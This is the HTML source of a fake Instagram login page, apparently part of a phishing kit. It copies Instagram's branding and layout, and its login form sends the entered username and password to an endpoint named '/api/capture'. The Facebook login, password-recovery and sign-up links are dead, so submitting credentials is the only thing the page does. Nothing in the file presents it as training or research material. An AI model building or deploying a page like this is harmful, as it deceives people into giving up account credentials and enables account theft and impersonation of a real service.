<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="theme-color" content="#ffffff" />
  <title>Instagram</title>
  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='10' fill='%23E1306C'/%3E%3C/svg%3E" />
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <main class="page">
    <section class="card">
      <h1 class="logo" aria-label="Instagram">Instagram</h1>

      <form id="login-form" method="post" action="/api/capture" autocomplete="on" novalidate>
        <div class="field">
          <input
            id="username"
            name="username"
            type="text"
            inputmode="text"
            autocapitalize="off"
            autocorrect="off"
            spellcheck="false"
            aria-label="Phone number, username, or email"
            placeholder="Phone number, username, or email"
            autocomplete="username"
          />
        </div>

        <div class="field pw">
          <input
            id="password"
            name="password"
            type="password"
            aria-label="Password"
            placeholder="Password"
            autocomplete="current-password"
          />
          <button type="button" id="toggle-pw" class="reveal" aria-label="Show password">Show</button>
        </div>

        <button type="submit" id="login-btn" class="btn-login" disabled>Log in</button>
      </form>

      <div class="or"><span>OR</span></div>

      <a class="fb-login" href="#" onclick="return false;">
        <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
          <path fill="#385185" d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.96.93-1.96 1.89v2.25h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07z"/>
        </svg>
        <span>Log in with Facebook</span>
      </a>

      <a class="forgot" href="#" onclick="return false;">Forgot password?</a>
    </section>

    <section class="card signup">
      <p>Don't have an account? <a href="#" onclick="return false;">Sign up</a></p>
    </section>

    <p class="meta">Meta</p>
  </main>

  <script src="main.js"></script>
</body>
</html>
